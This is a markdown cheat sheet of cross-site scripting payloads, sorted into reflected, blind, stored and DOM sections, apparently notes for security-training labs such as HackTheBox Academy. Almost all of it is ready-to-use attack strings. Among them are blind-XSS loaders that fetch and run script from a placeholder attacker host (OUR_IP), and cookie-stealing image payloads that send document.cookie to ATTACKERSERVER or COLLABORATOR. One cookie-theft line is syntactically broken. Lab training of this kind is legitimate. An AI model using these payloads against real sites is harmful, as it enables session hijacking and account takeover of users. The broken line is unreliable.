**TRY to avoid alert() on Chrome 92+ as it may not work anymore. print() is good though**
## Reflected XSS

```JS
'><script>alert();</script><!--
```

Redirect
```JS
<img src=x onerror="window.location.href='https://COLLABORATOR'">
```

Reflected off Javascript:
Break out of search and insert javascript with angled brackets comment out
```JS
test';alert(HACKED)//';
```

## Blind XSS

```js
<script src=http://OUR_IP></script>
```

```js
'><script src=http://OUR_IP></script>
```

```js
"><script src=http://OUR_IP></script>
```

```js
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
```

```js
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
```

```js
<script>$.getScript("http://OUR_IP")</script>
```

Steal Cookie with Picture:
```js
<script>var -=new Image;i.src="<COLLABORATOR>/?c="+document.cookie;</script>
```

Steal cookies using img:
```js
<img src="x" onerror="new Image().src='http://ATTACKERSERVER/?c='+encodeURIComponent(document.cookie)+'&t='+Date.now();" />
```

## Stored XSS

```js
<script>alert(document.cookie)</script>
```

```js
<script>alert(window.origin)</script>
```

```js
<script>print()</script>
```

```js
<script>document.body.style.background = "#141d2b"</script>
```

```js
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
```

```js
<script>document.title = 'HackTheBox Academy'</script>
```

```js
"><img src=x onerror=prompt(document.domain)>
```
```js
"><img src=x onerror=confirm(1)>
```

```js
"><img src=x onerror=alert(1)>
```

```js
<button onclick=alert(1)>click</button>
```

Add to an SVG XML Metadata:
```js
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

For href anchored form inputs, try javascript command:
```js
javascript:prompt()
```

### Dom XSS

Javascript:
```js
\"-alert(1)}//
```
```js
"><img src=x onerror=alert(1)>
```


Images:
```js
"><svg onload=alert(1)>
```

Select:
```js
"></select><img%20src=1%20onerror=alert(1)>"
```

InnerHTML:
```js
><img src=1 onerror=alert(document.domain)>
```

```js
<><img src=1 onerror=alert(1)>
```

```js
<img src="" onerror=alert(window.origin)>
```

```js
document.getElementsByTagName('body')[0].innerHTML = "New Text"
```


JQuery
```URL
?returnUrl=javascript:alert(document.domain)
```
```jQuery
<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=print()>'"> 
```                           
```jQuery
$("#todo").html('New Text');
```

Angular:
```
{{constructor.constructor('alert(1)')()}}
```

HTML:
```html
<script>
		location = 'https://vulnerable-website.com/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```
